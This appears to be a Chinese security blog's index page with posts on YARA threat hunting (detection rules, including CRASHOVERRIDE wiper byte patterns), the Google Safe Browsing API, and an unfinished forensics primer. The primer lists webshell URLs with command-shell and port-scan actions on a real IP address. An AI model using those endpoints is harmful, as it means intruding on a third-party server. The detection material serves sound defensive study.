<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  <title>SY0U&#39;s Blog</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta name="description" content="一半技术 一半生活">
<meta property="og:type" content="website">
<meta property="og:title" content="SY0U&#39;s Blog">
<meta property="og:url" content="http://wsygoogol.github.io/index.html">
<meta property="og:site_name" content="SY0U&#39;s Blog">
<meta property="og:description" content="一半技术 一半生活">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="SY0U&#39;s Blog">
<meta name="twitter:description" content="一半技术 一半生活">
  
    <link rel="alternate" href="/atom.xml" title="SY0U&#39;s Blog" type="application/atom+xml">
  
  
    <link rel="icon" href="/favicon.png">
  
  
    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
  
  <link rel="stylesheet" href="/css/style.css">
  

</head>

<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">SY0U&#39;s Blog</a>
      </h1>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"></a>
        
          <a class="main-nav-link" href="/">Home</a>
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
      </nav>
      <nav id="sub-nav">
        
          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="Flux RSS"></a>
        
        <a id="nav-search-btn" class="nav-icon" title="Rechercher"></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://wsygoogol.github.io"></form>
      </div>
    </div>
  </div>
</header>
      <div class="outer">
        <section id="main">
  
    <article id="post-About-the-Blog" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2016/06/08/About-the-Blog/" class="article-date">
  <time datetime="2016-06-08T10:54:05.000Z" itemprop="datePublished">2016-06-08</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2016/06/08/About-the-Blog/">About the Blog</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>之前的用wordpress + mysql在阿里云搭建了一套博客，域名是( <a href="http://wsygoogol.cn" target="_blank" rel="external">http://wsygoogol.cn</a> )维护成本比较高，被人用扫描器扫一下直接被阿里云下线。加上也懒得去写博客了，域名和主机都因为未续费被回收了。<br>最近两年的漏洞分析和技术分享文章都发在公司博客、公司内网论坛、公司公众号上，比较乱。平时看文章看到好多人都在用Hexo，一直想弄一个，因为一些事情耽搁了，最近试了一下还真不错。就在github上搭一个，虽然由于大家都懂的的原因有点慢。但是流量应该不会太大，需求也没那么多，暂时先用着，如果有需求再迁移吧。<br>我决定用这个博客，记录工作和学习中的踩过的坑，把学到的知识和经验分享出来。我也经常在知乎上回答一些问题，写一些生活的感悟和读书笔记。如果好的，以后也会同步过来。</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://wsygoogol.github.io/2016/06/08/About-the-Blog/" data-id="cjl3ht161000rww9lyzd6z5nd" class="article-share-link">Partager</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="w-使用YARA规则进行威胁狩猎" class="article article-type-w" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2018/08/14/使用YARA规则进行威胁狩猎/" class="article-date">
  <time datetime="2018-08-14T05:17:20.000Z" itemprop="datePublished">2018-08-14</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2018/08/14/使用YARA规则进行威胁狩猎/">使用YARA规则进行威胁狩猎</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>​     <a href="https://virustotal.github.io/yara/" target="_blank" rel="external">YARA</a> (yet another regex alternative) 是一种具有多种用途的模式匹配工具，在恶意软件分析和报警中有广泛的应用。框架本身很简单，相对容易理解(特别是基本字符串匹配方面)，而且非常灵活。然而，在应用到非常具体的恶意软件示例之后，YARA通常仅限于签名式使用。虽然这本身并不是一个“坏”的用途，但人为地限制了安全研究人员在环境中进行和捕获的内容。</p>
<p>​    在典型应用中，YARA被用作另一种基于签名的恶意软件检测方法。在由Christopher Culling撰写的SANS<a href="https://www.sans.org/reading-room/whitepapers/tools/yara-rules-rule-basic-advanced-38560" target="_blank" rel="external">论文</a>中可以找到YARA的优秀概述。 在去年年底围绕<a href="https://dragos.com/blog/trisis/" target="_blank" rel="external">TRISIS</a>/<a href="https://www.fireeye.com/blog/threat-research/2017/12/attackers-deploy-new-ics-attack-framework-triton.html" target="_blank" rel="external">TRITON</a> 恶意软件的激烈讨论是一个更具体的例子。当时，FireEye研究员尼克·卡尔（<a href="https://twitter.com/ItsReallyNick" target="_blank" rel="external">Nick Carr</a>)发布了YARA规则，并<a href="https://twitter.com/ItsReallyNick/status/941346442748289024" target="_blank" rel="external">强调</a>它在几个月内没有发现误报。 从针对特定威胁的集中检测的角度来看，这是一个非常有效的，高度针对性的规则，用于捕获在特定的攻击中观察到的非常具体的恶意软件实例。 然而，在这种检测过程中，由于规则本身受限，仅能捕获TRISIS事件中观察到的恶意软件的特定实例 ，在这种情况下，针对有一些变化的类似软件会有大量漏报。用Matthew Dunwoody和Daniel Bohannon所描述的概念来解释 ：签名是有效的，但不一定是“有弹性”。 因此，所应用的检测方法对于特定事件非常有效，但可能对变化的攻击无效。 本质上，仅为观察到的安全系统攻击框架的实现创建规则。 </p>
<p>​    另一种观点认为，YARA和现在的反病毒产品中的恶意软件检测是重复的 。 考虑到YARA在许多情况下的应用，这种立场是可以理解的，但大大低估了YARA在检测和警报方面的多功能性。 当以“传统”方式应用时，对传统防病毒来说，YARA只是代表了开源，灵活的竞争者。 虽然这是有用的，但最终的功能和限制仍然是相同。</p>
<p>​    上述两种观点对YARA的理解都是片面的。 YARA当然可以用于针对确切的恶意软件类型，家族甚至样本进行非常具体的检测，但这样做完全忽略了YARA的灵活性，可以检测文件中的可疑（如果不是彻头彻尾的恶意）功能。从狩猎的角度来看，我们作为防御者不希望追求明确知道的恶意软件，可能其他安全控制已经处理过这些恶意软件（例如商业防病毒）。 相反，威胁搜寻应该通过搜索找出进一步研究和分析的潜在攻击来寻找可能的恶意活动的迹象。 从YARA的角度来看，这意味着不会寻找确切的恶意软件签名，而是在文件中检测可能的恶意活动。 </p>
<p>为了举例说明我用YARA进行威胁狩猎，请遵循以下非常简单的规则： </p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">rule odd_creation_date</div><div class="line"></div><div class="line">&#123;</div><div class="line"></div><div class="line">meta:</div><div class="line"></div><div class="line">description = <span class="string">"Identifying times either in the distant past or future for alerting."</span></div><div class="line"></div><div class="line">author = <span class="string">"Joe Slowik, Dragos Inc"</span></div><div class="line"></div><div class="line">condition:</div><div class="line"></div><div class="line">pe.timestamp &gt; time.now() or  pe.timestamp &lt; 946684800</div><div class="line"></div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>以上规则是查找具有特定编译时间戳的可移植可执行文件。 就其本身而言，这是一个可疑的检测点 ，但不一定是恶意的。 但作为与上下文信息配对的检测点，这个非常简单的规则可以变得非常强大：例如，在监视环境中对“新”二进制文件的过滤器进行配对或作为搜索应用时，或从未知或者之前没有见过的网站下载二进制文件。</p>
<p>稍微复杂一点，以下是程序化混淆或打包的规则：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line">rule suspicious_pe_entropy</div><div class="line"></div><div class="line">&#123;</div><div class="line"></div><div class="line">meta:</div><div class="line"></div><div class="line">description = <span class="string">"Identify PE sections with high levels of entropy indicating encoding."</span></div><div class="line"></div><div class="line">author = <span class="string">"Joe Slowik, Dragos Inc."</span></div><div class="line"></div><div class="line">condition:</div><div class="line"></div><div class="line">uint16(0) == 0x5a4d and pe.number_of_sections &gt; 2 and</div><div class="line"></div><div class="line"><span class="keyword">for</span> any i <span class="keyword">in</span> (0..pe.number_of_sections -1): (</div><div class="line"></div><div class="line">math.entropy(pe.sections[i].raw_data_offset, </div><div class="line"></div><div class="line">pe.sections[i].raw_data_size) &gt;= 7.4)</div><div class="line"></div><div class="line">&#125;</div></pre></td></tr></table></figure>
<pre><code>在这种情况下，查看PE部分熵来识别混淆或打包的代理，规则迭代每个部分以确定是否满足阈值。一些合法的软件为了防止逆向工程或是竞争对手分析，具有这些方面，但这可作为与其他方面相结合的指标，上述内容可以作为狩猎（或监控）初始输入，以识别新的，尚未知晓的恶意活动。 
</code></pre><p>最后，通常利用文档文件格式来传递恶意payload。虽然宏很流行，但嵌入式ActiveX对象（如Flash对象或PE文件）可以类似地用于启动利用和渗透。 </p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div></pre></td><td class="code"><pre><div class="line">rule embedded_activex</div><div class="line"></div><div class="line">&#123;</div><div class="line"></div><div class="line">meta:</div><div class="line"></div><div class="line">Description = <span class="string">"Rule to identify embedded ActiveX objects in Documents."</span></div><div class="line"></div><div class="line">Author = <span class="string">"Joe Slowik, Dragos Inc."</span></div><div class="line"></div><div class="line">strings:</div><div class="line"></div><div class="line"><span class="variable">$header1</span> = &#123; D0 CF 11 E0 &#125;</div><div class="line"></div><div class="line"><span class="variable">$header2</span> = &#123; 50 4B 03 04 &#125;</div><div class="line"></div><div class="line"><span class="variable">$flashHeader1</span> = &#123; 46 57 53 &#125;</div><div class="line"></div><div class="line"><span class="variable">$flashHeader2</span> = &#123; 43 57 53 &#125;</div><div class="line"></div><div class="line"><span class="variable">$mzHeader</span> = &#123;4d 5a &#125;</div><div class="line"></div><div class="line"><span class="variable">$wmfExtension</span> = <span class="string">".wmf"</span> nocase ascii wide</div><div class="line"></div><div class="line"><span class="variable">$activex</span> = <span class="string">"word/activex/activex"</span> nocase wide ascii</div><div class="line"></div><div class="line"><span class="variable">$activex_reg</span> = /word\/activeX\/activeX[1-9]\.bin/ nocase wide ascii</div><div class="line"></div><div class="line"><span class="variable">$active</span> = <span class="string">"active"</span> nocase ascii wide</div><div class="line"></div><div class="line">condition:</div><div class="line"></div><div class="line">1 of (<span class="variable">$header</span>*) and (<span class="comment">#activex &gt; 0) and (1 of ($flashHeader*) or $mzHeader or $wmfExtension) and #active &lt; 170 and $activex_reg</span></div><div class="line"></div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>同样，此规则将捕获“合法”项目 - 但与其他观察结果配合并实施为狩猎（如果不是警报）技术，可用于识别躲避传统控制的恶意文档文件。 </p>
<p>上面的例子有两个互补的想法：首先，YARA可以用来寻找可疑行为的指标;第二，YARA不必局限于已知恶意活动的确切签名。 </p>
<p>结果是YARA签名在某种程度上是“模糊的”：就他们自己而言，它们可能意义不大（并且可能导致大量误报，这取决于环境 - 所以不要在隔离中使用这些项目）。 但是，与其他丰富的数据点或分析相结合，这样的YARA检测可以变得非常有效，作为新的，而不是之前观察到的恶意活动的领先指标。 </p>
<p>然而，还有第三个案例利用YARA进行狩猎，这利用了人类的弱点和懒惰。 在这种情况下，攻击者 - 甚至是高级攻击者 - 都是人类，并且易于或需要重用以前操作中的环境，开发材料和代码库。 正如我的前同事<a href="https://twitter.com/m1k4chu" target="_blank" rel="external">Micah Yates</a>, 在2017年ReCon的 <a href="https://recon.cx/2017/montreal/resources/slides/RECON-MTL-2017-evolution_of_pirpi.pdf" target="_blank" rel="external">APT3/Pirpi talk</a> 演讲中详细介绍的那样，“高级”对手在近10年的时间里使用了几乎相同的功能来应对多种恶意软件变种。 结果：寻找攻击者可以利用“常见”功能的独特实现（例如套接字创建或数据擦除）来检测未来其他安全解决方案无法检测到的变体。 例如，与CRASHOVERRIDE / INDUSTROYER中的“wiper”功能相关联的注册表操作项： </p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line">rule crashoverride_wiperModuleRegistry</div><div class="line"></div><div class="line">&#123;</div><div class="line"></div><div class="line">meta:</div><div class="line"></div><div class="line">description = <span class="string">"Registry Wiper functionality assoicated with CRASHOVERRIDE"</span></div><div class="line"></div><div class="line">author = <span class="string">"Joe Slowik, Dragos Inc"</span></div><div class="line"></div><div class="line">strings:</div><div class="line"></div><div class="line"><span class="variable">$s0</span> = &#123; 8d 85 a0 ?? ?? ?? 46 50 8d 85 a0 ?? ?? ?? 68 68 0d ?? ?? 50 &#125;</div><div class="line"></div><div class="line"><span class="variable">$s1</span> = &#123; 6a 02 68 78 0b ?? ?? 6a 02 50 68 b4 0d ?? ?? ff b5 98 ?? ?? ?? ff 15 04 ?? ?? ?? &#125;</div><div class="line"></div><div class="line"><span class="variable">$s2</span> = &#123; 68 00 02 00 00 8d 85 a0 ?? ?? ?? 50 56 ff b5 9c ?? ?? ?? ff 15 00 ?? ?? ?? 85 c0 &#125;</div><div class="line"></div><div class="line">condition:</div><div class="line"></div><div class="line">uint16(0) == 0x5a4d and all of them</div><div class="line"></div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>三个字节码元素上的这个非常小的签名将CRASHOVERRIDE抽头模块中的非常特定的功能归零。上述签名跟踪观察到的恶意软件实例和应用程序，但也通过关注恶意软件中部署的独特功能来寻求提供更长期的功能：将Windows系统服务值重新映射为null。  YARA背后的假设很简单：此功能可能会被相同（或类似）的攻击者重用，开发特定于功能的检测将捕获重用相同底层代码库和功能的新恶意软件类型。 虽然类似签名，但此规则旨在寻找可重复使用或类似地实现相同基础功能的其他案例或样本 - 从而创建比经典的，狭窄定制的签名更广泛的检测基础。 这次检测特别有趣的是，OlympicDestroyer恶意软件利用了一种技术，表面上与CRASHOVERRIDE的擦除功能非常相似：重新映射关键的Windows系统服务注册表值，以防止成功的功能重启。</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://wsygoogol.github.io/2018/08/14/使用YARA规则进行威胁狩猎/" data-id="cjl3ht17g0019ww9legz5nyzr" class="article-share-link">Partager</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="w-Google-Safe-Browsing-Api介绍" class="article article-type-w" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2018/07/31/Google-Safe-Browsing-Api介绍/" class="article-date">
  <time datetime="2018-07-31T07:25:01.000Z" itemprop="datePublished">2018-07-31</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2018/07/31/Google-Safe-Browsing-Api介绍/">Google Safe Browsing Api介绍</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h3 id="Safe-Browing-API-简介"><a href="#Safe-Browing-API-简介" class="headerlink" title="Safe Browing API 简介"></a>Safe Browing API 简介</h3><p>​    Safe browsing (安全浏览)是谷歌提供的一种服务，利用谷歌持续更新的恶意网址和钓鱼网站的数据集，来检测url的安全性，帮助我们有效抵御<a href="https://safebrowsing.google.com/#policies" target="_blank" rel="external">网上诱骗、社交工程、恶意软件、垃圾软件</a>、恶意广告、侵扰性广告以及侮辱性网站或扩展程序带来的危害。 </p>
<p>​    支持谷歌浏览器和火狐浏览器。</p>
<h3 id="Safe-Browsing-API-使用"><a href="#Safe-Browsing-API-使用" class="headerlink" title="Safe Browsing API 使用"></a>Safe Browsing API 使用</h3><h5 id="Google-Safe-Browsing-Google-Developers-官网"><a href="#Google-Safe-Browsing-Google-Developers-官网" class="headerlink" title="Google Safe Browsing | Google Developers 官网"></a>Google Safe Browsing | Google Developers 官网</h5><p><a href="https://developers.google.com/safe-browsing/" target="_blank" rel="external">https://developers.google.com/safe-browsing/ </a></p>
<p>通过介绍了解到Safe Browsing APIs(V3)现在已经弃用,将于2018年10月1日被拒绝使用。 所有Safe Browsing API客户端都应该使用（v4）API。 </p>
<h5 id="Safe-Browsing-APIs-v4-官网"><a href="#Safe-Browsing-APIs-v4-官网" class="headerlink" title="Safe Browsing APIs(v4)官网"></a>Safe Browsing APIs(v4)官网</h5><p><a href="https://developers.google.com/safe-browsing/v4/" target="_blank" rel="external">https://developers.google.com/safe-browsing/v4/</a></p>
<p>要确定URL是否位于任何安全浏览列表中,浏览器客户端可以使用Lookup API(在线版本)或Update API(离线版本)。</p>
<h5 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h5><p><a href="https://accounts.google.com/signup/v2/webcreateaccount?flowName=GlifWebSignIn&amp;flowEntry=SignUp" target="_blank" rel="external">创建Google账户</a></p>
<p><a href="https://cloud.google.com/resource-manager/docs/creating-managing-projects?hl=en&amp;visit_id=1-636686269369798517-522602518&amp;rd=1" target="_blank" rel="external">创建项目工程</a></p>
<p><a href="https://cloud.google.com/docs/authentication/api-keys?hl=en&amp;ref_topic=6262490&amp;visit_id=1-636686278056026695-2572364886&amp;rd=1" target="_blank" rel="external">申请API key</a>,创建的项目是通过API key与谷歌提供的API服务相连接的一个接口。 </p>
<p><a href="https://support.google.com/cloud/answer/6158841?hl=en" target="_blank" rel="external">激活API</a>,选择相应的项目，选择API和服务，然后选择库，点击Enable</p>
<h5 id="Lookup-API-v4"><a href="#Lookup-API-v4" class="headerlink" title="Lookup API (v4)"></a>Lookup API (v4)</h5><p>​    Lookup API就是浏览器将URL发送到Google Safe Browsing服务器以检查其安全性。Lookup API比Update API简单易用。 </p>
<h6 id="优点"><a href="#优点" class="headerlink" title="优点"></a>优点</h6><p>简单的URL检测:您发送带有URL的HTTP POST请求，服务器以URL的状态（安全或不安全）进行响应。</p>
<h6 id="缺点"><a href="#缺点" class="headerlink" title="缺点"></a>缺点</h6><p>隐私:URL没有经过加密处理,服务器知道你查找到URL。</p>
<p>响应时间:每个查找请求都由服务器处理，影响效率。</p>
<h6 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h6><p>参考：<a href="https://developers.google.com/safe-browsing/v4/lookup-api" target="_blank" rel="external">https://developers.google.com/safe-browsing/v4/lookup-api</a></p>
<p>Request header</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">POST https://safebrowsing.googleapis.com/v4/threatMatches:find?key=API_KEY HTTP/1.1</div><div class="line">Content-Type: application/json</div></pre></td></tr></table></figure>
<p>Request body</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">&#123;</div><div class="line">    <span class="string">"client"</span>: &#123;</div><div class="line">      <span class="string">"clientId"</span>:      <span class="string">"yourcompanyname"</span>,</div><div class="line">      <span class="string">"clientVersion"</span>: <span class="string">"1.5.2"</span></div><div class="line">    &#125;,</div><div class="line">    <span class="string">"threatInfo"</span>: &#123;</div><div class="line">      <span class="string">"threatTypes"</span>:      [<span class="string">"MALWARE"</span>, <span class="string">"SOCIAL_ENGINEERING"</span>],</div><div class="line">      <span class="string">"platformTypes"</span>:    [<span class="string">"WINDOWS"</span>],</div><div class="line">      <span class="string">"threatEntryTypes"</span>: [<span class="string">"URL"</span>],</div><div class="line">      <span class="string">"threatEntries"</span>: [</div><div class="line">        &#123;<span class="string">"url"</span>: <span class="string">"http://www.urltocheck1.org/"</span>&#125;,</div><div class="line">        &#123;<span class="string">"url"</span>: <span class="string">"http://www.urltocheck2.org/"</span>&#125;,</div><div class="line">        &#123;<span class="string">"url"</span>: <span class="string">"http://www.urltocheck3.com/"</span>&#125;</div><div class="line">      ]</div><div class="line">    &#125;</div><div class="line">  &#125;</div></pre></td></tr></table></figure>
<p>Response header</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">HTTP/1.1 200 OK</div><div class="line">Content-Type: application/json</div></pre></td></tr></table></figure>
<p>Response body:包含了匹配信息，列表名称和列表里匹配到的URL(如果匹配到)，元数据等。如果没有匹配，则HTTP POST响应只会在响应正文中返回一个空对象。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div></pre></td><td class="code"><pre><div class="line">&#123;</div><div class="line">  <span class="string">"matches"</span>: [&#123;</div><div class="line">    <span class="string">"threatType"</span>:      <span class="string">"MALWARE"</span>,</div><div class="line">    <span class="string">"platformType"</span>:    <span class="string">"WINDOWS"</span>,</div><div class="line">    <span class="string">"threatEntryType"</span>: <span class="string">"URL"</span>,</div><div class="line">    <span class="string">"threat"</span>:          &#123;<span class="string">"url"</span>: <span class="string">"http://www.urltocheck1.org/"</span>&#125;,</div><div class="line">    <span class="string">"threatEntryMetadata"</span>: &#123;</div><div class="line">      <span class="string">"entries"</span>: [&#123;</div><div class="line">        <span class="string">"key"</span>: <span class="string">"malware_threat_type"</span>,</div><div class="line">        <span class="string">"value"</span>: <span class="string">"landing"</span></div><div class="line">     &#125;]</div><div class="line">    &#125;,</div><div class="line">    <span class="string">"cacheDuration"</span>: <span class="string">"300.000s"</span></div><div class="line">  &#125;, &#123;</div><div class="line">    <span class="string">"threatType"</span>:      <span class="string">"MALWARE"</span>,</div><div class="line">    <span class="string">"platformType"</span>:    <span class="string">"WINDOWS"</span>,</div><div class="line">    <span class="string">"threatEntryType"</span>: <span class="string">"URL"</span>,</div><div class="line">    <span class="string">"threat"</span>:          &#123;<span class="string">"url"</span>: <span class="string">"http://www.urltocheck2.org/"</span>&#125;,</div><div class="line">    <span class="string">"threatEntryMetadata"</span>: &#123;</div><div class="line">      <span class="string">"entries"</span>: [&#123;</div><div class="line">        <span class="string">"key"</span>:   <span class="string">"malware_threat_type"</span>,</div><div class="line">        <span class="string">"value"</span>: <span class="string">"landing"</span></div><div class="line">     &#125;]</div><div class="line">    &#125;,</div><div class="line">    <span class="string">"cacheDuration"</span>: <span class="string">"300.000s"</span></div><div class="line">  &#125;]</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h5 id="Update-API-v4"><a href="#Update-API-v4" class="headerlink" title="Update API (v4)"></a>Update API (v4)</h5><p>​    Update API就是浏览器定期与Google Safe Browsing服务器通信，下载最新的加密版本的安全浏览列表，系统会将该列表的最新副本存储在您本地的系统上。浏览器会参照该本地列表检查您访问的每个网站对应的网址和下载的文件。如果您要浏览的网址出现在该列表中，Chrome 会向 Google 发送网址指纹的一部分（相应网址的 SHA-256 哈希值的前 32 位），以便验证该网址是否确实不安全。如果某个网站请求的权限可能不安全，Chrome 也会发送网址指纹的一部分；这样一来，如果该网站包含恶意内容，Google 就可以保护您免受攻击。</p>
<h6 id="优点-1"><a href="#优点-1" class="headerlink" title="优点"></a>优点</h6><p>隐私：服务器不知道实际查询的URL。</p>
<p>响应时间：不需要每次检查URL时查询服务器。</p>
<h6 id="缺点-1"><a href="#缺点-1" class="headerlink" title="缺点"></a>缺点</h6><p>使用复杂</p>
<h6 id="Firefox本地缓存目录"><a href="#Firefox本地缓存目录" class="headerlink" title="Firefox本地缓存目录"></a>Firefox本地缓存目录</h6><ul>
<li><code>~/.cache/mozilla/firefox/XXXX/safebrowsing/</code> on Linux</li>
<li><code>~/Library/Caches/Firefox/Profiles/XXXX/safebrowsing/</code> on Mac</li>
<li><code>C:\Users\XXXX\AppData\Local\mozilla\firefox\profiles\XXXX\safebrowsing\</code> on Windows</li>
</ul>
<h6 id="使用-1"><a href="#使用-1" class="headerlink" title="使用"></a>使用</h6><p><a href="https://developers.google.com/safe-browsing/v4/update-api" target="_blank" rel="external">https://developers.google.com/safe-browsing/v4/update-api</a></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://wsygoogol.github.io/2018/07/31/Google-Safe-Browsing-Api介绍/" data-id="cjl3ht17d0017ww9ll30jb0z5" class="article-share-link">Partager</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="w-数字取证入门" class="article article-type-w" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2018/06/29/数字取证入门/" class="article-date">
  <time datetime="2018-06-29T09:18:59.000Z" itemprop="datePublished">2018-06-29</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2018/06/29/数字取证入门/">数字取证入门</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h3 id="0x00-数字取证介绍"><a href="#0x00-数字取证介绍" class="headerlink" title="0x00 数字取证介绍"></a>0x00 数字取证介绍</h3><p>这篇文章将涵盖有关数字取证的各种主题，希望能够成为该领域的一个很好的介绍。数字取证（或计算机取证）是取证科学的最新分支，重点关注数字数据的恢复和后续分析/调查做为法庭上的有效证据。我的意思是，你不能再法庭上随便提出某些事情，将其称为证据。</p>
<p>因此，有必要通过适当的扣押、获取、分析、识别、确认、解释、记录以及最后的陈述来保存数字证据。</p>
<p>如你看到的，这是一个非常漫长而复杂的过程。鉴于其复杂性，数字取证操作通常需要一个专业的多学科团队。有些人可能专注于网络取证，其他人则专注于手机取证。一些行动甚至可能需要各种计算机相关领域的专家（硬件，数据库，电信等）。</p>
<p>通过本文，我将重点关注数字取证的法律/法庭相关方面，而不是私人调查方面，即使它们在技术上完全相同。</p>
<h6 id="数字证据"><a href="#数字证据" class="headerlink" title="数字证据"></a>数字证据</h6><p>证据，是证明某一命题是真实还是有效的。但是，数字证据的概念更为具体。 这样，它可以由存储在任何数字/电子存储介质中的任何类型的证明信息来定义，或者通过公共或私人计算机/通信网络传输。简单的说，它是以数字/二进制形式存储或传输的任何（证明）数据/信息。</p>
<p>我们越来越频繁地生成大量数据，这意味着它正变得无处不在。 因此，即使数字证据通常与计算机和电子犯罪有关，它现在也被用来起诉各种犯罪（例如，收回的电子邮件可能会泄露犯罪的意图或动机，甚至可能是失踪的人)。</p>
<p>在比较传统和数字证据时，我们会发现它们有一些相似之处：</p>
<p>它们既脆弱又易于操纵，损坏或毁坏;<br>他们可以通过物理方式或通过互联网轻松跨越地理和司法管辖区;<br>它们的价值通常取决于它们的确切日期/时间和地点（它们是时间敏感的）;</p>
<p>处理数字证据时我们面临的一些问题是：</p>
<h3 id="0x01-方法论和过程模型"><a href="#0x01-方法论和过程模型" class="headerlink" title="0x01 方法论和过程模型"></a>0x01 方法论和过程模型</h3><h3 id="0x02-取证的过程"><a href="#0x02-取证的过程" class="headerlink" title="0x02 取证的过程"></a>0x02 取证的过程</h3><p>hh</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">http://211.144.202.238:8080/1.asp</div><div class="line">http://211.144.202.238:8080/wt.asp</div><div class="line">http://211.144.202.238:8080/aspxspy.aspx</div><div class="line">http://211.144.202.238:8080/a.aspx</div><div class="line">http://211.144.202.238:8080/x.asp</div><div class="line">http://211.144.202.238:8080/1.asp?Action=MainMenu</div><div class="line">http://211.144.202.238:8080/1.asp?Action=Show1File</div><div class="line">http://211.144.202.238:8080/1.asp?Action=Cmd1Shell</div><div class="line">http://211.144.202.238:8080/1.asp?Action=ScanPort</div></pre></td></tr></table></figure>
<p>hh</p>

      
    </div>
    <footer class="article-footer">
